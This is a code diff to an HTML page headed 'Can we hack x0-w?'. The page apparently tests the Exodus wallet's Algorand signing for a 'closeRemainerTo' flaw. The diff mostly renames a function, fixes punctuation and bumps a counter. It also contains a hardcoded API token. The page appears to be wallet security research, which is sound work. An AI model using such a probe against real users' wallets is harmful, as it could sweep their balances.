@@ -43,12 +43,8 @@
                 window.exodus.algorand.connect();
             }
 
-
-            
-
-
             // closeRemainerTo vuln
-            async function transaction() {
+            async function algo_transaction() {
                 const baseServer = "https://algo.a.exodus.io/";
                 const port = "";
                 const token = { 'x-algo-api-token': 'bd5833a117efc9256eee8e3488f2eb430555f690be37805070b259f16fafb052' };
@@ -77,12 +73,12 @@
                 console.log(txn);
 ​
                 const result = await window.exodus.algorand.connect();
-                console.log({result})
+                console.log({result});
                 const tmp = await window.exodus.algorand.signAndSendTransaction([
                     txn.toByte(),
                 ]);
-                console.log({tmp})
-                const { signedTransactions } = tmp
+                console.log({tmp});
+                const { signedTransactions } = tmp;
 ​
                 console.log('[*] Transaction: ');
                 console.log(signedTransactions);
@@ -260,7 +256,7 @@
 
         <div style="margin-top:30%;padding: 6px;width:50%;background-color:#000;color:#0E0;border:7px groove #D1D">
         <h1 style="color:#D1D;text-shadow: 2px 2px 4px #FF6;">
-        56
+        57
         </h1>
         <h2>Can we hack x0-w?</h2>
         
@@ -269,7 +265,7 @@
         <hr />
         <input type="button" value="algo_connect" onclick="algo_connect()" />
         <input type="button" value="accept_connection" onclick="accept_connection()" />
-        <input type="button" value="transaction" onclick="transaction()" />
+        <input type="button" value="algo_transaction" onclick="algo_transaction()" />
         <input type="button" value="asset_transaction" onclick="asset_transaction()" />
         <hr />
         <h3>ETH</h3>
